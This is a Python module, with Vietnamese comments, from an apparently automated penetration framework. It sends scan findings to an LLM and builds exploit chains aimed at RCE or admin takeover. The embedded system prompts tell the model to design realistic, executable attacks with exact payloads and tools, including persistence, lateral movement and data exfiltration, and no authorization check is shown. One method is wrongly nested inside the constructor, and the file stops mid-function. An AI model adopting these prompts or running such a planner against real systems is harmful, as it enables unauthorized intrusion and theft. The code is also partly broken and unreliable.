"""
ai/chain_planner.py - Exploit Chain Builder
Lên kế hoạch exploit chain dựa trên findings
Ví dụ: user enum → password brute → login → upload plugin → reverse shell
"""

import hashlib
import json
import logging
import os
import re
import time
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse

from core.executor import run_command  # Thêm import để exec tools
from core.url_normalizer import URLNormalizer

logger = logging.getLogger("recon.chain_planner")

# ─── SYSTEM PROMPT FOR CHAIN PLANNING ───────────────────────────────────────
_CHAIN_PLANNER_SYSTEM = """You are an advanced offensive security strategist designing real-world compromise paths.

Your objective: Build multi-step exploitation chains that reflect how attackers actually compromise systems.

CRITICAL SUCCESS FACTORS:
1. Each chain must be REALISTIC and EXECUTABLE
2. Prioritize chains leading to RCE, admin access, or database compromise
3. Consider prerequisites (authentication, file upload capability, API access)
4. Think about persistence, privilege escalation, and lateral movement
5. Identify the MINIMUM STEPS to achieve compromise

EACH CHAIN SHOULD INCLUDE:

1. entry_point - The initial vulnerable endpoint (URL, method, parameters)

2. steps - Ordered exploitation steps, each with:
- name, action, target, tool, success_indicator
- produces: what concrete data/access this step creates (e.g. "valid_credentials", "admin_session", "webshell_url")
- consumes: what data from a previous step this step needs (e.g. "valid_credentials" from step 2)
- depends_on: list of step names whose 'produces' this step consumes

3. technique - Main exploitation approach

4. expected_impact - RCE / admin access / data exfiltration / credential theft

5. preconditions_met - list of conditions already confirmed in current scan context

6. preconditions_missing - list of conditions still needed before this chain can execute

7. next_recommended_scan - specific module names to run to fill gaps (e.g. "jwt_analyzer", "boolean_sqli")

REMEMBER:
- Think like a penetration tester, not a vulnerability scanner
- Focus on BUSINESS IMPACT
- The 'produces' / 'consumes' fields are MANDATORY — they describe the data flowing between steps

Return ONLY valid JSON."""

# ─── SYSTEM PROMPT FOR DATA-FLOW CHAIN REASONING ─────────────────────────────
_DATAFLOW_CHAIN_SYSTEM = """You are an expert penetration tester reasoning about how to chain discovered vulnerabilities into a complete attack path ending in RCE or admin takeover.

You will receive a list of CONFIRMED VULNERABILITIES found on a target.
For each vulnerability you must think:
  - What does this vulnerability PRODUCE? (credentials, file-write, code-exec, session, username-list, db-dump, etc.)
  - What does it CONSUME? (does it need credentials? an authenticated session? a list of usernames?)

Then reason about CONNECTIONS:
  - Which vuln's PRODUCE feeds another vuln's CONSUME?
  - Can you trace a path from an unauthenticated starting point to RCE by following these connections?

OUTPUT FORMAT (JSON array of chains):
[
  {
    "name": "short chain name",
    "goal": "what is achieved at the end",
    "risk_level": "CRITICAL|HIGH|MEDIUM",
    "reasoning": "one paragraph explaining WHY these vulns connect and how",
    "steps": [
      {
        "order": 1,
        "name": "step name",
        "action": "what to do",
        "target": "exact URL or endpoint",
        "tool": "sqlmap|curl|wpscan|hydra|metasploit|manual",
        "payload": "exact payload or flag string",
        "success_indicator": "what response/output means success",
        "produces": ["list", "of", "data", "this", "step", "creates"],
        "consumes": ["list", "of", "data", "needed", "from", "previous", "steps"],
        "depends_on": ["step name whose produce this step consumes"]
      }
    ],
    "preconditions_met": ["conditions already confirmed in the scan context"],
    "preconditions_missing": ["any condition not yet confirmed that is needed"],
    "next_recommended_scan": ["specific module names to run if preconditions are missing, e.g. 'boolean_sqli', 'jwt_analyzer'"]
  }
]

RULES:
- Every step MUST have 'produces' and 'consumes' lists (use [] if nothing needed/produced)
- A step's 'consumes' MUST be satisfied by a previous step's 'produces' OR already confirmed
- Do NOT invent vulnerabilities — only use what is in the confirmed list
- Prefer chains that require ZERO new conditions (all pieces already found)
- If a chain needs one more piece, list it in 'preconditions_missing' and fill 'next_recommended_scan'
- Return ONLY valid JSON, no markdown."""

def repair_json(json_str: str) -> str:
    """Sửa các lỗi JSON phổ biến từ AI response"""
    # Fix thiếu dấu phẩy giữa các object: }{ -> },{
    json_str = re.sub(r'}\s*{', '},{', json_str)
    
    # Fix thiếu dấu phẩy giữa các array: ][ -> ],[
    json_str = re.sub(r']\s*\[', '],[', json_str)
    
    # Fix thiếu dấu phẩy sau giá trị: "value" "key" -> "value", "key"
    json_str = re.sub(r'"\s+"', '", "', json_str)
    json_str = re.sub(r'(\d+|true|false|null)\s+"', r'\1, "', json_str)
    
    # Fix thiếu dấu phẩy sau } khi theo sau là { hoặc [
    json_str = re.sub(r'}\s*(\{|\[)', r'},\1', json_str)
    
    # Fix thiếu dấu phẩy sau ] khi theo sau là { hoặc [
    json_str = re.sub(r']\s*(\{|\[)', r'],\1', json_str)
    
    return json_str



    
@dataclass
class ExploitStep:
    name: str
    action: str
    target: str
    tool: Optional[str] = None
    payload: Optional[str] = None
    depends_on: List[str] = field(default_factory=list)
    success_indicator: str = ""
    priority: int = 5
    preconditions: List[str] = field(default_factory=list)  # e.g., ["authenticated", "file_upload_available"]
    postconditions: List[str] = field(default_factory=list)  # e.g., ["file_written", "code_executed"]


@dataclass
class ExploitChain:
    name: str
    description: str
    steps: List[ExploitStep]
    risk_level: str = "HIGH"
    estimated_time: str = "unknown"
    prerequisites: List[str] = field(default_factory=list)
    preconditions: List[str] = field(default_factory=list)  # Overall chain preconditions
    postconditions: List[str] = field(default_factory=list)  # Overall chain outcomes


class ChainPlanner:
    """
    Plans exploit chains based on discovered vulnerabilities and findings.
    Prioritizes chains by impact and feasibility.
    Uses AI for enhanced chain generation when Groq client available.
    
    Enhanced with LLM-based planning that:
    - Uses AI to reason about exploit chains (not just hardcoded templates)
    - Integrates with PayloadOptimizer to leverage historical success data
    - Infers capabilities from discovered vulnerabilities
    - Falls back to rule-based planning when AI is unavailable
    """

    def __init__(self, state, learning_engine=None, groq_client=None, payload_optimizer=None, groq_context=None):
        self.state = state
        self.groq_context = groq_context  # GroqScanContext for accumulated cross-phase context
        self.learning_engine = learning_engine
        self.groq = groq_client
        self.payload_optimizer = payload_optimizer
        self._url_normalizer = URLNormalizer()
        self._rules = self._load_rules()



        def _clean_json_response(self, raw_response: str) -> dict:
            """Làm sạch và parse JSON an toàn từ response của Groq/LLM"""
            if not raw_response or not isinstance(raw_response, str):
                logger.warning("[CHAIN] Empty or non-string response from AI")
                return {}

            text = raw_response.strip()

            # Xóa markdown code block
            text = re.sub(r'```(?:json)?\s*', '', text, flags=re.IGNORECASE)
            text = re.sub(r'```\s*$', '', text, flags=re.IGNORECASE)

            # Tìm khối JSON
            json_match = re.search(r'(\{[\s\S]*\})', text)
            if json_match:
                text = json_match.group(1)

            # Thử parse trực tiếp
            # CODE MỚI (ĐÃ FIX)
            try:
                return json.loads(text)
            except json.JSONDecodeError:
                # Thử sửa lỗi thiếu dấu phẩy trước khi bỏ cuộc
                try:
                    repaired = repair_json(text)
                    return json.loads(repaired)
                except:
                    pass

            # Fix phổ biến
            try:
                fixed = re.sub(r"(?<!\\)'", '"', text)
                fixed = re.sub(r',\s*([}\]])', r'\1', fixed)
                fixed = repair_json(fixed)
                return json.loads(fixed)
            except json.JSONDecodeError as e:
                logger.error(f"[CHAIN] JSON parse failed after cleaning: {e}")
                logger.debug(f"[CHAIN] Raw cleaned text: {text[:500]}...")
                return {}

    # ─── AI-POWERED PLANNING METHODS ──────────────────────────────────────────────

    def _parse_array_or_object(self, text: str):
        """Parse a JSON array OR object from Groq response.

        `_clean_json_response` only handles objects `{...}`.
        This method also handles arrays `[...]` which is what
        `reason_chain_from_vulns` and similar dataflow prompts return.
        """
        if not text or not isinstance(text, str):
            return None
        text = text.strip()
        # Strip markdown code fences
        text = re.sub(r"```(?:json)?", "", text, flags=re.IGNORECASE).strip("`").strip()
        # Try direct parse first (handles both arrays and objects)
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass
        # Try to extract array [...] first, then object {...}
        for pattern in [r"(\[[\s\S]*\])", r"(\{[\s\S]*\})"]:
            m = re.search(pattern, text)
            if m:
                try:
                    return json.loads(m.group(1))
                except json.JSONDecodeError:
                    try:
                        return json.loads(repair_json(m.group(1)))
                    except Exception:
                        pass
        return None

    # ─── RULES ENGINE ─────────────────────────────────────────────────────────────

    def _load_rules(self) -> List[Dict[str, Any]]:
        """Load chain rules from rules/chains.json relative to this file."""
        try:
            rules_path = os.path.join(os.path.dirname(__file__), "..", "rules", "chains.json")
            rules_path = os.path.normpath(rules_path)
            if os.path.exists(rules_path):
                with open(rules_path, "r") as f:
                    rules = json.load(f)
                logger.debug(f"[CHAIN] Loaded {len(rules)} rules from chains.json")
                return rules
        except Exception as e:
            logger.warning(f"[CHAIN] Could not load rules/chains.json: {e}")
        return []

    def _apply_rules(self) -> List[Dict[str, Any]]:
        """Match rules against current state and return rule-derived chains."""
        if not self._rules:
            return []

        confirmed_vulns = self.state.get("confirmed_vulnerabilities", []) or []
        vulnerabilities = self.state.get("vulnerabilities", []) or []
        all_vulns = confirmed_vulns + vulnerabilities
        tech_stack = self.state.get("technologies", {}) or {}
        wp_version = self.state.get("wp_version", "") or ""
        endpoints = self.state.get("prioritized_endpoints", []) or self.state.get("endpoints", []) or []
        endpoint_urls = [
            (ep if isinstance(ep, str) else ep.get("url", "")) for ep in endpoints
        ]

        chains = []
        for rule in self._rules:
            cond = rule.get("condition", {})
            ctype = cond.get("type", "")
            matched = False

            if ctype == "tech":
                tech_name = cond.get("tech", "").lower()
                if any(tech_name in str(k).lower() for k in tech_stack):
                    ver_cmp = cond.get("version_compare", "")
                    if ver_cmp and wp_version:
                        try:
                            op, ver = ver_cmp[0], ver_cmp[1:]
                            cur = tuple(int(x) for x in wp_version.split(".")[:2])
                            tgt = tuple(int(x) for x in ver.split(".")[:2])
                            matched = (op == "<" and cur < tgt) or (op == ">" and cur > tgt) or (op == "=" and cur == tgt)
                        except Exception:
                            matched = True
                    else:
                        matched = True

            elif ctype == "vuln":
                type_name = cond.get("type_name", "").lower()
                severity = cond.get("severity", "").lower()
                for v in all_vulns:
                    v_type = str(v.get("type", "")).lower()
                    v_sev = str(v.get("severity", "")).lower()
                    if type_name and type_name in v_type:
                        if not severity or severity in v_sev or v_sev in ("critical", "high"):
                            matched = True
                            break

            elif ctype == "endpoint":
                path = cond.get("path", "").lower()
                if path and any(path in url.lower() for url in endpoint_urls):
                    matched = True

            elif ctype == "fragments":
                required = cond.get("required", [])
                # Map fragments to state keys / endpoint patterns
                fragment_checks = {
                    "upload_form": lambda: any("upload" in u.lower() for u in endpoint_urls),
                    "directory_listing": lambda: any(
                        v.get("type", "").lower() in ("directory_listing", "dirlist") for v in all_vulns
                    ),
                    "lfi_vulnerability": lambda: any("lfi" in str(v.get("type", "")).lower() for v in all_vulns),
                }
                matched = all(fragment_checks.get(frag, lambda: False)() for frag in required)

            if not matched:
                continue

            # Convert rule actions to chain steps
            steps = []
            for action in rule.get("actions", []):
                steps.append({
                    "name": action.get("type", "rule_action"),
                    "action": action.get("type", ""),
                    "target": self._get_base_url(),
                    "payload": action.get("args", ""),
                    "tool": action.get("type", ""),
                    "success_indicator": "rule condition met",
                    "description": rule.get("name", ""),
                })

            chains.append({
                "name": rule.get("name", rule.get("id", "rule_chain")),
                "goal": rule.get("name", ""),
                "steps": steps,
                "evidence": [f"rule:{rule.get('id', '')}"],
                "confidence": 0.75 + (0.05 * (3 - min(rule.get("priority", 3), 3))),
                "preconditions_met": [ctype],
                "preconditions_missing": [],
                "primitive": ctype,
                "severity": "HIGH",
                "risk_level": "HIGH",
                "force_chain": rule.get("priority", 3) == 1,
                "source": "rules_engine",
            })
            logger.info(f"[CHAIN] Rule matched: {rule.get('id')} — {rule.get('name')}")

        return chains

    def _get_planning_vulnerabilities(self, include_detected: bool = False) -> List[Dict[str, Any]]:
        verified = self.state.get("verified_vulnerabilities", []) or []
        if verified:
            return verified
        confirmed = self.state.get("confirmed_vulnerabilities", []) or []
        if confirmed:
            return confirmed
        if include_detected:
            return self.state.get("vulnerabilities", []) or []
        return []

    def _infer_capabilities(self) -> List[str]:
        """Infer what actions are possible based on discovered vulnerabilities.
        
        This method analyzes the current state to determine what exploitation
        capabilities are available, which helps the AI planner understand
        what actions can be taken.
        
        Returns:
            List of capability strings (e.g., ['sql_injection', 'file_upload', 'http_request'])
        """
        caps = []
        vulns = self._get_planning_vulnerabilities()
        hints = self.state.get("vulnerability_hints", []) or []
        endpoints = self.state.get("prioritized_endpoints", []) or []
        
        # Check vulnerabilities for capabilities
        for v in vulns:
            vtype = str(v.get("type") or "").lower()
            vname = str(v.get("name") or "").lower()
            vuln_text = f"{vtype} {vname}"
            
            if "sql" in vuln_text or "sqli" in vuln_text:
                caps.append("sql_injection")
            if "upload" in vuln_text or "file" in vuln_text:
                caps.append("file_upload")
            if "xss" in vuln_text or "cross-site" in vuln_text:
                caps.append("xss")
            if "lfi" in vuln_text or "traversal" in vuln_text or "include" in vuln_text:
                caps.append("file_read")
            if "rce" in vuln_text or "command" in vuln_text or "exec" in vuln_text:
                caps.append("command_execution")
            if "ssrf" in vuln_text:
                caps.append("ssrf")
            if "auth" in vuln_text or "bypass" in vuln_text:
                caps.append("auth_bypass")
            if "idor" in vuln_text or "insecure direct" in vuln_text:
                caps.append("idor")
            if "deserial" in vuln_text:
                caps.append("deserialization")
        
        # Check vulnerability hints
        for hint in hints:
            hint_lower = str(hint or "").lower()
            if "upload" in hint_lower:
                caps.append("file_upload")
            if "sqli" in hint_lower or "sql" in hint_lower:
                caps.append("sql_injection")
            if "xss" in hint_lower:
                caps.append("xss")
            if "lfi" in hint_lower or "rfi" in hint_lower:
                caps.append("file_read")
            if "rce" in hint_lower:
                caps.append("command_execution")
            if "ssrf" in hint_lower:
                caps.append("ssrf")
        
        # Check endpoints for capabilities
        for ep in endpoints:
            if not isinstance(ep, dict):
                continue
            url = ep.get("url", "").lower()
            categories = ep.get("categories", []) or []
            
            if any(kw in url for kw in ["upload", "file", "media", "attachment"]):
                if "file_upload" not in caps:
                    caps.append("file_upload")
            if any(kw in url for kw in ["login", "auth", "admin", "wp-admin"]):
                if "authentication" not in caps:
                    caps.append("authentication")
            if any(kw in url for kw in ["api", "rest", "graphql", "json"]):
                if "api_access" not in caps:
                    caps.append("api_access")
            if any(kw in categories for kw in ["admin", "upload", "auth"]):
                if f"endpoint_{kw}" not in caps:
                    caps.append(f"endpoint_{kw}")
        
        # WordPress-specific capabilities
        if self.state.get("wordpress_detected"):
            caps.append("wordpress_exploitation")
            if self.state.get("wp_users"):
                caps.append("user_enumeration")
            if self.state.get("wp_plugins"):
                caps.append("plugin_enumeration")
            if self.state.get("wp_vulnerabilities") or self.state.get("wp_vulns"):
                caps.append("wordpress_vulnerability")
        
        # Always available
        if "http_request" not in caps:
            caps.append("http_request")
        
        return list(set(caps))  # Remove duplicates

    def _build_planner_state(self) -> Dict[str, Any]:
        """Build comprehensive state for AI planner.
        
        This method gathers all relevant information from the current state
        into a structured format suitable for LLM-based planning.
        
        Returns:
            Dictionary containing all relevant planning information
        """
        # Get top payloads from optimizer if available
        successful_payloads = []
        if self.payload_optimizer:
            try:
                successful_payloads = self.payload_optimizer.get_top_payloads_by_category(limit=20)
            except Exception as e:
                logger.debug(f"[CHAIN] Failed to get payloads from optimizer: {e}")
        
        # Build WordPress context
        wp_context = {
            "detected": self.state.get("wordpress_detected", False),
            "version": self.state.get("wp_version", "unknown"),
            "users": self.state.get("wp_users", []),
            "plugins": self.state.get("wp_plugins", []),
            "themes": self.state.get("wp_themes", []),
            "vulnerabilities": self.state.get("wp_vulnerabilities", []) or self.state.get("wp_vulns", []),
        }
        
        # Build endpoints summary
        endpoints = self.state.get("prioritized_endpoints", []) or []
        endpoint_summary = []
        for ep in endpoints[:20]:  # Limit to top 20
            if isinstance(ep, dict):
                endpoint_summary.append({
                    "url": ep.get("url", ""),
                    "method": ep.get("method", "GET"),
                    "categories": ep.get("categories", []),
                    "vulnerability_hints": ep.get("vulnerability_hints", []),
                    "response_code": ep.get("response_code"),
                })
        
        # Build vulnerabilities summary
        vulns = self._get_planning_vulnerabilities()
        vuln_summary = []
        for v in vulns[:15]:  # Limit to top 15
            if isinstance(v, dict):
                vuln_summary.append({
                    "type": v.get("type", ""),
                    "name": v.get("name", ""),
                    "endpoint": v.get("endpoint", v.get("url", "")),
                    "severity": v.get("severity", "MEDIUM"),
                    "description": v.get("description", ""),
                })
        
        result = {
            "target": self.state.get("target", ""),
            "base_url": self._get_base_url(),
            "endpoints": endpoint_summary,
            "vulnerabilities": vuln_summary,
            "wordpress": wp_context,
            "capabilities": self._infer_capabilities(),
            "technologies": self.state.get("tech_stack", []) or self.state.get("technologies", []),
            "successful_payloads": successful_payloads,
            "goal": "rce_or_admin_access",
            "alternative_goals": [
                "data_exfiltration",
                "credential_theft",
                "persistence",
                "privilege_escalation"
            ],
        }
        # Attach full GroqScanContext summary when available for richer cross-phase reasoning
        if self.groq_context is not None:
            try:
                result["groq_context_summary"] = self.groq_context.to_summary()
                result["auth_surfaces"] = self.groq_context.auth_surfaces[:10]
                result["exposed_services"] = self.groq_context.exposed_services[:10]
                result["js_secrets_count"] = len(self.groq_context.js_secrets)
                result["failed_attempts"] = self.groq_context.failed_attempts[-5:]
                result["phases_completed"] = self.groq_context.phases_completed
            except Exception:
                pass
        return result

    def _plan_with_ai(self) -> List[ExploitChain]:
        """Use AI to generate exploit chains based on comprehensive state analysis.
        
        This method sends the current state to the LLM and asks it to reason
        about optimal exploitation chains, considering:
        - Available capabilities and vulnerabilities
        - Historical success rates from payload optimizer
        - Multi-step chain possibilities
        - Fallback options if primary attack fails
        
        Returns:
            List of ExploitChain objects generated by AI
        """
        if not self.groq:
            return []
        
        try:
            # Check if Groq circuit breaker is open
            if hasattr(self.groq, '_circuit_state') and self.groq._circuit_state.name == 'OPEN':
                logger.debug("[CHAIN] Groq circuit breaker OPEN - skipping AI planning")
                return []
            
            # Build comprehensive state for planning
            planner_state = self._build_planner_state()
            
            # Check if we have minimum evidence for AI planning
            if not self._has_minimum_chain_evidence():
                logger.debug("[CHAIN] Insufficient evidence for AI planning")
                return []
            
            # ── Primary path: data-flow reasoning across ALL confirmed vulns ──
            all_vulns = self._get_planning_vulnerabilities(include_detected=True)
            dataflow_chains = self.reason_chain_from_vulns(all_vulns)
            if dataflow_chains:
                logger.info("[CHAIN] Dataflow reasoning → %d chains", len(dataflow_chains))
                for c in dataflow_chains:
                    logger.info(
                        "[CHAIN] → [DATAFLOW] [%s] %s | missing=%s",
                        c.get("risk_level", "?"), c.get("name", "?"),
                        c.get("preconditions_missing", []),
                    )
                # Convert to ExploitChain objects for compatibility
                result_chains: List[ExploitChain] = []
                for c in dataflow_chains:
                    steps = []
                    for s in (c.get("steps") or []):
                        steps.append(ExploitStep(
                            name=s.get("name", s.get("action", "step")),
                            action=s.get("action", ""),
                            target=self._resolve_step_target(
                                s.get("target", ""), s.get("name", ""), s.get("action", "")
                            ),
                            tool=s.get("tool", "curl"),
                            payload=s.get("payload", ""),
                            success_indicator=s.get("success_indicator", ""),
                            depends_on=s.get("depends_on", []),
                            preconditions=s.get("consumes", []),
                            postconditions=s.get("produces", []),
                        ))
                    result_chains.append(ExploitChain(
                        name=c.get("name", "Dataflow Chain"),
                        description=c.get("reasoning", c.get("goal", "")),
                        steps=steps,
                        risk_level=c.get("risk_level", "HIGH"),
                    ))
                return result_chains

            # ── Fallback: generic AI planning ────────────────────────────────
            prompt = self._build_ai_planning_prompt(planner_state)
            response = self.groq.generate(
                prompt=prompt,
                system=_CHAIN_PLANNER_SYSTEM,
                temperature=0.3,
                max_tokens=2000,
            )
            chains = self._parse_ai_plan_response(response, planner_state)
            if chains:
                logger.info(f"[CHAIN] AI planner generated {len(chains)} chains")
                for chain in chains:
                    logger.info(f"[CHAIN] → [AI] [{chain.risk_level}] {chain.name}")
            return chains
            
        except Exception as e:
            error_msg = str(e)
            if '403' in error_msg or 'Forbidden' in error_msg:
                logger.warning("[CHAIN] Groq API 403 Forbidden - AI planning disabled")
                self.groq = None
            else:
                logger.debug(f"[CHAIN] AI planning failed: {e}")
            return []

    def _build_ai_planning_prompt(self, state: Dict[str, Any]) -> str:
        """Build data-flow-aware planning prompt.

        Groq is asked to reason about WHAT EACH VULN PRODUCES and
        HOW PRODUCTIONS CONNECT to form a chain towards RCE.
        """
        vulns = state.get("vulnerabilities", [])
        techs = state.get("technologies", [])
        wp = state.get("wordpress", {})
        endpoints = state.get("endpoints", [])

        wp_block = ""
        if wp.get("detected"):
            users = wp.get("users") or self.state.get("wp_users") or []
            wp_block = (
                f"\nWORDPRESS {wp.get('version','unknown')}: "
                f"users={users}, plugins={len(wp.get('plugins',[]))}"
            )

        return f"""DATA-FLOW CHAIN REASONING

Target: {state.get('target','')}  Stack: {', '.join(str(t) for t in techs)}{wp_block}

CONFIRMED VULNERABILITIES (these are the building blocks):
{json.dumps(vulns, indent=2)}

ENDPOINTS (context):
{json.dumps([e.get('url','') for e in endpoints[:10]], indent=2)}

TASK — reason step by step:
1. For EACH vulnerability above, state what it PRODUCES (credentials / file-write /
   code-exec / username-list / session-token / db-dump / admin-access / etc.)
2. For EACH vulnerability, state what it CONSUMES (nothing / credentials / session / etc.)
3. Draw the CONNECTION graph: which produce feeds which consume?
4. Find ALL complete paths from "unauthenticated" → "RCE or admin takeover"
   using ONLY the confirmed vulns as nodes.
5. For any path that is almost complete (needs 1 more piece), list what is missing
   in preconditions_missing.

Return a JSON array following the schema in your instructions.
Every step MUST have 'produces' and 'consumes' arrays.
Return ONLY valid JSON."""

    def reason_chain_from_vulns(self, vulns: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Ask Groq to reason about how confirmed vulns chain together.

        This is the PRIMARY chain-generation path — Groq reasons about data
        flow (what each vuln produces / consumes) and builds paths to RCE
        using only confirmed evidence, no hardcoded templates.

        Returns a list of chain dicts with steps containing 'produces'/'consumes'.
        """
        if not self.groq or not vulns:
            return []

        # Build a compact vuln summary emphasising URLs and types
        vuln_nodes = []
        for v in vulns:
            node = {
                "type": str(v.get("type") or v.get("vuln_type", "unknown")).lower(),
                "url": str(v.get("url") or v.get("endpoint", "")),
                "severity": str(v.get("severity", "MEDIUM")),
                "evidence": str(v.get("evidence", ""))[:120],
                "confidence": float(v.get("confidence", 0.5) or 0.5),
            }
            vuln_nodes.append(node)

        # Include found usernames and tech context
        users = self.state.get("wp_users") or []
        techs_raw = self.state.get("tech_stack") or self.state.get("technologies") or {}
        techs = list(techs_raw.keys()) if isinstance(techs_raw, dict) else list(techs_raw)

        live_hosts = self.state.get("live_hosts") or []
        tech_fingerprints = []
        for h in live_hosts[:3]:
            if isinstance(h, dict):
                tech_fingerprints.extend(h.get("tech") or h.get("technologies") or [])
        techs = list(dict.fromkeys(techs + tech_fingerprints))[:15]

        prompt = f"""DATA-FLOW CHAIN REASONING

Target: {self.state.get('target','')}
Stack: {', '.join(str(t) for t in techs)}
Enumerated users: {users}

CONFIRMED VULNERABILITIES — your building blocks:
{json.dumps(vuln_nodes, indent=2)}

TASK:
Step 1 — For each vuln node, write what it PRODUCES and CONSUMES.
Step 2 — Draw the data-flow graph: which produce satisfies which consume?
Step 3 — Find ALL complete chains (no missing pieces) from unauthenticated → RCE/admin.
Step 4 — Find chains missing exactly ONE piece; put that piece in preconditions_missing.
Step 5 — Rank chains by completeness (complete first) then by impact.

Every step in your output MUST contain:
  "produces": ["what data/access this step creates"],
  "consumes": ["what data this step needs from a previous step"],
  "depends_on": ["name of previous step that provides the consumed data"]

Return ONLY valid JSON array."""

        try:
            response = self.groq.generate(
                prompt=prompt,
                system=_DATAFLOW_CHAIN_SYSTEM,
                temperature=0.2,
                max_tokens=2000,
            )
            # Parse response — handles both array [...] and object {...}
            raw = self._parse_array_or_object(response)
            if not raw:
                return []
            items = raw if isinstance(raw, list) else [raw]
            result = []
            for item in items:
                if not isinstance(item, dict):
                    continue
                steps = item.get("steps", [])
                if not steps:
                    continue
                # Normalise step fields
                for step in steps:
                    step.setdefault("produces", [])
                    step.setdefault("consumes", [])
                    step.setdefault("depends_on", [])
                item.setdefault("preconditions_missing", [])
                item.setdefault("preconditions_met", [
                    n["type"] for n in vuln_nodes
                ])
                item["source"] = "groq_dataflow"
                item["planner_mode"] = "dataflow"
                result.append(item)
            logger.info("[CHAIN] reason_chain_from_vulns → %d chains from Groq", len(result))
            return result
        except Exception as e:
            logger.warning("[CHAIN] reason_chain_from_vulns failed: %s", e)
            return []

    def _parse_ai_plan_response(self, response: str, state: Dict[str, Any]) -> List[ExploitChain]:
            """Parse AI response into ExploitChain objects with robust JSON cleaning."""
            chains = []
            base_url = state.get('base_url', self._get_base_url())
            
            if not response or not isinstance(response, str):
                logger.warning("[CHAIN] Empty AI response received")
                return chains

            try:
                # Sử dụng hàm clean JSON
                chain_data = self._clean_json_response(response)
                
                if not chain_data:
                    logger.warning("[CHAIN] Failed to parse AI plan response")
                    return chains

                # Handle both array of chains and single chain
                if isinstance(chain_data, dict):
                    chain_data = [chain_data]
                elif not isinstance(chain_data, list):
                    logger.warning("[CHAIN] AI response is not a list or dict")
                    return chains

                for cd in chain_data:
                    if not isinstance(cd, dict):
                        continue
                    
                    chain_name = cd.get('name', 'AI Generated Chain')
                    chain_desc = cd.get('description', '')
                    risk_level = cd.get('risk_level', 'HIGH')
                    
                    if risk_level not in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                        risk_level = 'HIGH'
                    
                    # Parse steps
                    steps = []
                    steps_data = cd.get('steps', [])
                    
                    for step_data in steps_data:
                        if not isinstance(step_data, dict):
                            continue
                        
                        step_name = step_data.get('name') or step_data.get('action') or 'Unknown Step'
                        step_action = step_data.get('action', step_name)
                        step_target = self._resolve_step_target(step_data.get('target', base_url), step_name, step_action)
                        
                        if not step_name.strip():
                            continue
                        
                        step = ExploitStep(
                            name=step_name,
                            action=step_action,
                            target=step_target,
                            tool=step_data.get('tool', 'curl'),
                            payload=step_data.get('payload', ''),
                            success_indicator=step_data.get('success_indicator', 'success'),
                            depends_on=step_data.get('depends_on', []),
                            preconditions=step_data.get('preconditions', []),
                            postconditions=step_data.get('postconditions', []),
                            priority=step_data.get('priority', 5)
                        )
                        steps.append(step)
                    
                    if steps and chain_name:
                        chain = ExploitChain(
                            name=chain_name,
                            description=chain_desc,
                            steps=steps,
                            risk_level=risk_level,
                            estimated_time=f"{len(steps) * 5}-{len(steps) * 20} min",
                            prerequisites=cd.get('prerequisites', []),
                            preconditions=cd.get('preconditions', []),
                            postconditions=cd.get('postconditions', [])
                        )
                        chains.append(chain)
                        
            except Exception as e:
                logger.error(f"[CHAIN] Failed to parse AI plan response: {e}")
            
            return chains

    # ─── END AI-POWERED PLANNING METHODS ──────────────────────────────────────────

    def _has_minimum_chain_evidence(self) -> bool:
        """Require some concrete signal before generating high-impact exploit chains."""
        confirmed_vulns = self._get_planning_vulnerabilities()
        wp_vulns = self.state.get("wp_vulnerabilities", []) or self.state.get("wp_vulns", []) or []
        conditioned = self.state.get("wp_conditioned_findings", []) or []
        rce_paths = self.state.get("rce_chain_possibilities", []) or []
        security_findings = self.state.get("security_findings", []) or []
        prioritized = self.state.get("prioritized_endpoints", []) or []

        hint_count = 0
        upload_like = 0
        for ep in prioritized:
            if not isinstance(ep, dict):
                continue
            hint_count += len(ep.get("vulnerability_hints", []) or [])
            url = (ep.get("url") or "").lower()
            if any(marker in url for marker in ["upload", "xmlrpc", "wp-admin", "admin-ajax", "file="]):
                upload_like += 1

        evidence_score = (
            len(confirmed_vulns)
            + len(wp_vulns)
            + len(conditioned)
            + len(rce_paths)
            + min(len(security_findings), 2)
            + min(hint_count, 3)
            + min(upload_like, 2)
        )
        return evidence_score > 0

    def _get_base_url(self) -> str:
        """
        Extract base URL (scheme + domain) from state.
        Infers https:// by default, http:// for non-standard ports.
        Returns fully qualified URL with scheme.
        """
        # Try live_hosts first (they have full URLs)
        live_hosts = self.state.get("live_hosts", [])
        if live_hosts:
            host_url = live_hosts[0].get("url", "")
            if host_url:
                if host_url.startswith(('http://', 'https://')):
                    return host_url.rstrip('/')
        
        # Fall back to target domain
        target = self.state.get("target", "")
        if not target:
            return "https://localhost"
        
        # Add scheme if missing
        if not target.startswith(('http://', 'https://')):
            # Check for non-standard port → use http://
            if ':' in target and not target.startswith('['):  # Not IPv6
                return f"http://{target}"
            # Default to https
            return f"https://{target}"
        
        return target.rstrip('/')

    def _build_full_url(self, path: str) -> str:
        """
        Build full URL from base + path.
        Handles relative paths, ensures scheme is present.
        
        Args:
            path: Relative or absolute URL path
            
        Returns:
            Full URL with scheme, properly formatted
        """
        if not path:
            return self._get_base_url()
        
        # If already has scheme, return as-is
        if path.startswith(('http://', 'https://')):
            return path.rstrip('/')
        
        # Combine base URL with path
        base = self._get_base_url()
        # Strip leading slash from path to avoid double slashes
        path = path.lstrip('/')
        # Ensure path doesn't start with # or ? (fragment/query)
        if path.startswith(('#', '?')):
            return base + path
        return f"{base}/{path}"

    def _resolve_step_target(self, target: Optional[str], step_name: str = "", action: str = "") -> str:
        """Resolve placeholders and prevent empty/invalid step targets."""
        raw = (target or "").strip()
        if not raw:
            return self._get_base_url()

        placeholder = raw.lower()
        endpoints = self.state.get("prioritized_endpoints", []) or self.state.get("endpoints", []) or []
        wp_users = self.state.get("wp_users", []) or []

        def first_matching(predicate):
            for ep in endpoints:
                if isinstance(ep, dict) and predicate(ep):
                    return ep.get("url", "")
            return ""

        if placeholder in {"vulnerable_endpoint", "entry_point"}:
            return self._get_base_url()
        if placeholder == "upload_endpoint":
            match = first_matching(lambda ep: "upload" in (ep.get("url", "") + ep.get("path", "")).lower() or "file" in (ep.get("url", "") + ep.get("path", "")).lower())
            return match or self._get_base_url()
        if placeholder in {"login page", "login_endpoint"}:
            return self._build_full_url("wp-login.php")
        if placeholder in {"admin_panel", "admin panel"}:
            return self._build_full_url("wp-admin/")
        if placeholder == "attacker server":
            return "http://127.0.0.1:8000"
        if placeholder == "uploads/shell.php":
